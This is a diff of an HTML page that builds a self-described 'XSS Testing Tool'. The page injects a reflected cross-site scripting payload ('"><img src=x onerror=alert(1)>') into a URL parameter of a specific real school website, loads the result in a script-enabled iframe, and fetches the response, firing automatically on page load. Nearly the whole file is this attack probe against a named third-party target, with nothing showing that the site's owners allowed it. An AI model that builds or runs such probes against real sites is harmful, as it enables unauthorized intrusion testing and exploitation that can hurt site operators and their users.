@@ -1,8 +1,64 @@
 <!DOCTYPE html>
-<html>
-<head><title>XSS Test</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>XSS Testing Tool</title>
+</head>
 <body>
-  <h1>Test Payload</h1>
-  <iframe src="https://lalitpurnist.edu.np/?param=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;" width="600" height="400"></iframe>
+  <h1>XSS Testing Tool</h1>
+
+  <form id="testForm">
+    <label for="param">Parameter value for ?param=</label><br />
+    <input
+      type="text"
+      id="param"
+      name="param"
+      size="60"
+      value='"><img src=x onerror=alert(1)>' />
+    <button type="submit">Test</button>
+  </form>
+
+  <h2>Iframe Preview:</h2>
+  <iframe
+    id="previewFrame"
+    src=""
+    width="800"
+    height="400"
+    style="border: 1px solid #ccc;"
+    sandbox="allow-scripts allow-same-origin"
+  ></iframe>
+
+  <h2>Fetched Page Content:</h2>
+  <pre id="fetchedContent" style="white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; max-height: 400px; overflow-y: scroll;">
+  </pre>
+
+  <script>
+    const form = document.getElementById('testForm');
+    const iframe = document.getElementById('previewFrame');
+    const fetchedContent = document.getElementById('fetchedContent');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const paramValue = encodeURIComponent(form.param.value);
+      const testUrl = `https://lalitpurnist.edu.np/?param=${paramValue}`;
+
+      // Load URL in iframe
+      iframe.src = testUrl;
+
+      // Fetch page content via fetch API
+      fetch(testUrl)
+        .then((response) => response.text())
+        .then((data) => {
+          fetchedContent.textContent = data;
+        })
+        .catch((error) => {
+          fetchedContent.textContent = 'Fetch failed due to CORS or network error:\n' + error;
+        });
+    });
+
+    // Trigger initial test on page load
+    form.dispatchEvent(new Event('submit'));
+  </script>
 </body>
 </html>
